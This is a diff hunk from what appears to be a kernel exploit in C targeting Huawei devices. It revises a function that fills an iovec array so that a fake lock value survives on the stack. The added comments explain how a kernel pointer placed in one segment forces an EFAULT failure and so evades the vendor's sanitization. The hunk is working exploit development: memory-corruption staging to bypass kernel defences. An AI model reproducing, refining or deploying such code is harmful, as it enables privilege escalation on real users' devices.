@@ -246,11 +246,16 @@ static void overlay_fill_word(struct iovec *iv, int n, int slot, uint64_t v) {
 
 static void overlay_fill_iovec(struct iovec *iv, int n, int base_word) {
   memset(iv, 0, sizeof(*iv) * (size_t)n);
-  /* v4: ONLY word7 (W->lock) is a stack value - rides iov LEN slot 13
-     (proven to survive Huawei iov_base sanitization). Parent/child/top
-     nodes all live in the fake page (set from pselect_custom_target). */
+  /* v4: ONLY word7 (W->lock) is a stack value - rides iov LEN slot 13.
+     The array copy happens BEFORE validation; to keep the stack copy we
+     must fail with EFAULT (not EINVAL): put a kernel-ptr base in seg 5
+     so validation dies there (seg 6's huge len would trigger the
+     EINVAL path which sanitizes the stack array). */
   (void)base_word;
-  iv[13 / 2].iov_len = overlay_word_value(7);
+  iv[13 / 2].iov_base = (void *)0x10;           /* harmless user addr */
+  iv[13 / 2].iov_len = overlay_word_value(7);   /* W->lock (huge len) */
+  iv[5].iov_base = (void *)0xffffffc000000000ULL; /* kernel ptr -> EFAULT here */
+  iv[5].iov_len = 8;
 }
 
 static void overlay_fill_words(char *buf, size_t bytes, int base_word) {
